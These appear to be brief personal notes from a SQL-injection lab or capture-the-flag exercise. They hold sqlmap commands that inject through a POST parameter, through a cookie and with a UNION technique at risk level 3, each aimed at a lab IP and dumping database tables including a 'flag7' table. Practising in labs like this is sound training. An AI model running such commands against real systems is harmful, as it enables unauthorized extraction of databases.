
BURP za header visualization
### post REQUEST

```bash
sqlmap -u http://94.237.62.198:55804/case2.php --data "<param>=1" --batch --dump
```



### cookie manipulation

``` bash 
sqlmap -u http://94.237.62.198:55804/case3.php --cookie="<param>=1*" --batch --dump
```

#### specify union based

```bash 
 sqlmap -u http://94.237.62.198:55804/case7.php?id=1 --technique=U --union-cols=5 --risk=3 --dump --batch -T flag7

```